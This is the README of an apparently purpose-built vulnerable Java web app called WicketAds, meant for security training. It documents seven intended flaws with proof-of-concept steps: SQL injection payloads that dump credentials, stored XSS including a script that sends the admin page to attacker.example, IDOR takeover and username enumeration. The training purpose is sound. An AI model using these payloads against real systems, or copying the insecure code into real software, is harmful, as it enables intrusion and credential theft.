# WicketAds — Deliberately Vulnerable Classified-Ad Application

WicketAds is a **purposely insecure** Java web application built with Apache Wicket 10.9.0.  
It is intended for **security training, CTF challenges, and web-application penetration-testing practice**.

> **Warning:** Do not deploy this application on a public server or any network where untrusted users can reach it. It contains intentional, exploitable vulnerabilities.

---

## Technology Stack

| Component | Version |
|-----------|---------|
| Java | 17 |
| Apache Wicket | 10.9.0 |
| H2 Database | 2.2.224 (in-memory) |
| Jetty | 12.0.10 (embedded via Maven plugin) |
| Build tool | Maven 3.x |

---

## Running the Application

### Prerequisites

- JDK 17 or later
- Maven 3.8 or later

### Start

```bash
mvn jetty:run
```

The application starts at **http://localhost:8080**.  
The in-memory H2 database is seeded automatically on first startup.

### Stop

```
Ctrl+C
```

Or kill the process listening on port 8080.

### Seed Accounts

| Username | Password | Role |
|----------|----------|------|
| `admin`  | `admin`  | Admin |
| `alice`  | `alice123` | User |
| `bob`    | `bob456`   | User |

### Running Tests

```bash
mvn test
```

101 unit and integration tests covering all pages and services, including tests that **assert the vulnerabilities are exploitable**.

---

## Vulnerabilities

### 1. SQL Injection — Ad Search

**Location:** `AdService.java` → `search()`  
**Type:** CWE-89 — Improper Neutralisation of Special Elements in SQL Commands

The search query is built by string concatenation. User-supplied `keyword` and `category` values are placed directly into the SQL string with no parameterisation.

```java
// Vulnerable code
sql += " AND (LOWER(a.title) LIKE '%" + keyword.toLowerCase() + "%'" +
       " OR LOWER(a.description) LIKE '%" + keyword.toLowerCase() + "%')";
```

#### PoC 1 — Tautology (return all rows)

Use the search box on the homepage. Enter the following as the keyword:

```
' OR '1'='1' OR title LIKE '
```

The injected SQL becomes:

```sql
WHERE 1=1
AND (LOWER(a.title) LIKE '%' OR '1'='1' OR title LIKE '%'
     OR LOWER(a.description) LIKE '%' OR '1'='1' OR title LIKE '%')
ORDER BY a.created_at DESC
```

The tautology `'1'='1'` makes the entire WHERE clause always true. All ads are returned regardless of the keyword.

#### PoC 2 — UNION-based data extraction (dump user credentials)

Enter the following as the keyword:

```
%') UNION SELECT id,id,username,password,0.0,role,CURRENT_TIMESTAMP,username FROM users --
```

The ads table has 8 columns `(id, owner_id, title, description, price, category, created_at, owner_username)`. The UNION appends a row from the `users` table for every registered user, exposing usernames and **plain-text passwords** as ad titles and descriptions in the search results.

```sql
WHERE 1=1
AND (LOWER(a.title) LIKE '%%')
UNION SELECT id,id,username,password,0.0,role,CURRENT_TIMESTAMP,username FROM users --
...
```

**Impact:** Full read access to the `users` table, including credentials for all accounts.

---

### 2. Stored XSS — Ad Description

**Location:** `AdDetailPage.java`, `AdDetailPage.html`  
**Type:** CWE-79 — Improper Neutralisation of Input During Web Page Generation

Wicket's `Label` component HTML-escapes content by default. The ad description label has escaping explicitly disabled:

```java
Label description = new Label("description", ad.getDescription());
description.setEscapeModelStrings(false);   // VULNERABILITY
add(description);
```

#### PoC

1. Log in as any user and post a new ad.
2. In the **Description** field, enter:

```html
<img src=x onerror="alert(document.cookie)">
```

3. Submit the ad. Every visitor who opens the ad detail page will have the script execute in their browser.

**Impact:** Session hijacking, credential theft, defacement, redirection to malicious sites.

---

### 3. Stored XSS — Chat Messages

**Location:** `ChatPage.java`, `ChatPage.html`  
**Type:** CWE-79

Same root cause as above: the message body label has escaping disabled.

```java
Label body = new Label("body", msg.getBody());
body.setEscapeModelStrings(false);   // VULNERABILITY
item.add(body);
```

#### PoC

1. Log in as `bob` and send a message to `alice` about any ad:

```html
<script>
  fetch('/admin/users').then(r=>r.text()).then(t=>fetch('https://attacker.example/'+btoa(t)));
</script>
```

2. When `alice` opens her chat, the script executes. If alice is an admin, the script exfiltrates the admin user-management page (including plain-text passwords) to the attacker's server.

**Impact:** Same as above; particularly severe because it targets known authenticated users.

---

### 4. IDOR — Profile Takeover via Hidden Field

**Location:** `ProfilePage.java`  
**Type:** CWE-639 — Authorisation Bypass Through User-Controlled Key

The profile edit form embeds the target user's `id` in a hidden HTML field. The server reads this field on submission and updates **whatever user ID is sent**, without checking whether it matches the session user.

```java
// Server reads the userId from the submitted form, not from the session
int targetUserId = userIdModel.getObject();   // VULNERABILITY
UserService.update(targetUserId, ...);
```

#### PoC

1. Log in as `bob` (user ID 3) and navigate to `/profile`.
2. Open browser DevTools → Inspector. Find the hidden input:

```html
<input type="hidden" name="userId" value="3">
```

3. Change the value to `2` (alice's user ID):

```html
<input type="hidden" name="userId" value="2">
```

4. Fill in any username and password, then submit.
5. Alice's account has now been updated with the attacker-chosen credentials. Log out and log in as alice with the new password.

**Impact:** Full account takeover for any user, including the admin (ID 1).

---

### 5. IDOR — Read Any User's Conversations

**Location:** `ChatPage.java`  
**Type:** CWE-639

The chat page accepts a `userId` URL parameter to determine whose conversations to display. This parameter is never validated against the session user.

```java
// VULNERABILITY: userId from URL, not validated against session
int viewUserId = params.get("userId").toInt(sessionUserId);
List<ConversationSummary> conversations = MessageService.getConversations(viewUserId);
```

#### PoC

1. Log in as `bob`.
2. Navigate to the normal chat page: `http://localhost:8080/chat`
3. Change the URL to read alice's conversations:

```
http://localhost:8080/chat?userId=2
```

4. The page now shows alice's conversation list. Append `otherId` to read a specific thread:

```
http://localhost:8080/chat?userId=2&otherId=3
```

**Impact:** An authenticated attacker can read every private message sent by any user on the platform.

---

### 6. Sensitive Data Exposure — Plain-Text Passwords

**Location:** `AdminUserListPage.java`, `AdminUserListPage.html`  
**Type:** CWE-312 — Cleartext Storage of Sensitive Information

Passwords are stored and displayed as plain text. The admin user-management page renders every user's password directly in the HTML table.

```java
// In AdminUserListPage.java
item.add(new Label("password", user.getPassword()));
```

```html
<!-- In AdminUserListPage.html -->
<td class="td-pw" wicket:id="password"></td>
```

#### PoC

1. Log in as `admin` / `admin`.
2. Navigate to `/admin/users`.
3. Every user's plain-text password is visible in the **Password** column.

Additionally, the SQL injection UNION attack (Vulnerability 1, PoC 2) extracts the same plain-text passwords without requiring admin access.

**Impact:** Immediate credential exposure for all accounts. Because users reuse passwords, this likely compromises external accounts (email, banking, etc.).

---

### 7. Username Enumeration

**Location:** `LoginPage.java`  
**Type:** CWE-204 — Observable Response Discrepancy

The login form returns different error messages depending on whether the username exists:

```java
User user = UserService.findByUsername(username);
if (user == null) {
    error("User not found.");      // reveals the username does not exist
    return;
}
if (!user.getPassword().equals(password)) {
    error("Wrong password.");      // reveals the username does exist
    return;
}
```

#### PoC

Send POST requests to `/login` with various usernames:

```bash
# Existing user → "Wrong password."
curl -s -X POST http://localhost:8080/login \
  -d "username=alice&password=wrong" | grep -o 'Wrong password\|User not found'

# Non-existent user → "User not found."
curl -s -X POST http://localhost:8080/login \
  -d "username=nobody&password=wrong" | grep -o 'Wrong password\|User not found'
```

Automate with a username wordlist to enumerate all valid accounts before attempting password attacks.

**Impact:** Reduces brute-force effort by confirming which usernames are registered. Enables targeted spear-phishing.

---

## Vulnerability Summary

| # | Vulnerability | Location | CWE | OWASP 2021 |
|---|--------------|----------|-----|------------|
| 1 | SQL Injection (search) | `AdService.search()` | CWE-89 | A03 Injection |
| 2 | Stored XSS (ad description) | `AdDetailPage` | CWE-79 | A03 Injection |
| 3 | Stored XSS (chat messages) | `ChatPage` | CWE-79 | A03 Injection |
| 4 | IDOR — profile takeover | `ProfilePage` | CWE-639 | A01 Broken Access Control |
| 5 | IDOR — read any messages | `ChatPage` | CWE-639 | A01 Broken Access Control |
| 6 | Plain-text password storage | `AdminUserListPage` | CWE-312 | A02 Cryptographic Failures |
| 7 | Username enumeration | `LoginPage` | CWE-204 | A05 Security Misconfiguration |

---

## Project Structure

```
src/
├── main/java/de/sosec/wicketads/
│   ├── WicketAdsApplication.java   # Wicket application entry point
│   ├── WicketAdsSession.java       # Authenticated session
│   ├── db/
│   │   └── DatabaseInitializer.java  # Schema creation and seed data
│   ├── model/                      # Ad, User, Message, ConversationSummary
│   ├── pages/                      # One Java + HTML pair per page
│   └── service/                    # AdService, UserService, MessageService
├── main/resources/
├── main/webapp/
│   ├── css/wicketads.css           # Design system stylesheet
│   └── WEB-INF/web.xml
└── test/java/de/sosec/wicketads/
    ├── pages/                      # WicketTester integration tests
    └── service/                    # JDBC service unit tests
design-system/
└── MASTER.md                       # Design token reference
```

---

## Legal

This application is provided for **educational purposes only**.  
Exploitation of vulnerabilities against systems you do not own or have explicit written permission to test is illegal.
